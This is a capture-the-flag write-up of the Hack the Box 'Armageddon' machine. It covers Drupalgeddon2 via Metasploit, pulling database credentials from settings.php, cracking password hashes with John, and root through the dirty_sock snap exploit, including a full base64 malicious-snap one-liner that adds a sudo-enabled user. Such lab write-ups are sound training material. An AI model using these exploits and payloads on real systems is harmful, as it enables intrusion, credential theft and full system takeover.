+++
author = "Nick"
categories = ["hack the box", "easy", "Linux", "Drupal", "snap"]
date = 2021-07-24T18:21:42Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/06/armageddon.png"
slug = "hack-the-box-armegeddon"
tags = ["hack the box", "easy", "Linux", "Drupal", "snap"]
title = "Hack the Box - Armegeddon"

+++


Welcome back everyone! Today we're going to be doing the Hack the Box machine - Armegeddon. This is listed as an easy machine. Let's jump in.

As always, `nmap` is first: `nmap -sC -sV -p- -oA allscan 10.10.10.233`

Here are our results:
```
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

A slim amount of ports, let's see what's being hosted on 80. We see a basic site being hosted. A quick peek into the source codes shows its running on `drupal`. Funny since there was a time when [drupalgeddon](https://www.rapid7.com/blog/post/2018/04/27/drupalgeddon-vulnerability-what-is-it-are-you-impacted/) was a common thing to say.

So seeing this, we waste no time and jump right into `Metasploit`. Once loaded a quick search for `drupalgeddon` finds our exploit.

{{< figure src="__GHOST_URL__/content/images/2021/05/image-34.png" >}}

We select the drupalgeddon2 exploit. We set our `rhost` and `lhost` and let it rip. We don't need to change the target this time around, which is nice. We execute the script and get a shell back.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-8.png" >}}

Awesome, now we have a shell as the `php` daemon. We start to look around and find a default `settings.php` file. Sure enough, inside are some credentials!

{{< figure src="__GHOST_URL__/content/images/2021/06/image-9.png" >}}

Now that we have some database credentials, let's see what we can do to dump the database out.

Command:
`mysql -u drupaluser -p -D drupal`
`show tables;`

We get a large listing of tables. The one of interest to us, is users.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-10.png" >}}

Now, according to [this](https://www.drupal.org/files/er_db_schema_drupal_7.png) diagram, we should have a user and password field we can extract.

Command:
`select name,pass from users;`

We get back four users.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-11.png" >}}

Time to see if we can crack these hashes. We drop the hashes into a file called hash.lst and send it into `John` to see what comes back.

Command:
`john hash.lst -w /usr/share/wordlists/rockyou.txt`

{{< figure src="__GHOST_URL__/content/images/2021/06/image-12.png" >}}

Now that we have a password, for a user, let's try to `SSH` in with this set of credentials. We had four users and we didn't format this correctly in order to get the user associated to it. So we can use the `Metasploit` module `ssh_login` to verify our user / pass combo.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-14.png" >}}

Sure enough, it was brucetherealadmin.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-15.png" >}}

We can now login via SSH and snag our `user.txt` flag! Now that we have the flag, we take a look at what we can run with `sudo -l`. Sure enough, there's some permissions here.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-16.png" >}}

A quick googles shows us [this](https://www.exploit-db.com/exploits/46362). First we clone the Github repo down to our machine.

Command:
`git clone https://github.com/initstring/dirty_sock`

Then we'll host the files with a quick `SimpleHTTPServer` and pull them down to our target machine.

Command:
`python -m SimpleHTTPServer 80`
`wget my.ip/dirty_sockv2.py`

Minor road block shows up, our Python version is only Python 2. So we're going to have to parse the code to identify the peices we can leverage, and compile them into a file ourselves. 

The portion we want to leverage is the encoded string that represents a snap file.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-18.png" >}}

We can take this string and put it into our own malicious snap file. Then run our `sudo snap install` command to leverage it. Thanks to Python being awesome, we can simply run this from the CLI rather then compile a script. Don't forget we need to decode the base64.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-19.png" >}}

Here's our 'one liner':

```bash
python2 -c ‘print “aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw” + “A”*4256 + “==”’ | base64 -d > breakme.snap
```

This will create our malicous snap file. Now we need to call the snap file.

Command:
`sudo /usr/bin/snap install --devmode breakme.snap`

{{< figure src="__GHOST_URL__/content/images/2021/06/image-20.png" >}}

We need the `--devmode` option to bypass any snap policies in place. If everything goes well, we should now be able to `su` to our newly created user

{{< figure src="__GHOST_URL__/content/images/2021/06/image-21.png" >}}

Now if it all works out, which it doesn't when we're working on public machines, you should be able to `su dirty_sock`. Once we do that, we can then just get an interactive root shell with `sudo -i`

{{< figure src="__GHOST_URL__/content/images/2021/06/image-22.png" >}}

We can now snag the `root.txt` flag! Another machine down!

If you found this write-up useful, send some respect my way: https://app.hackthebox.eu/profile/95635



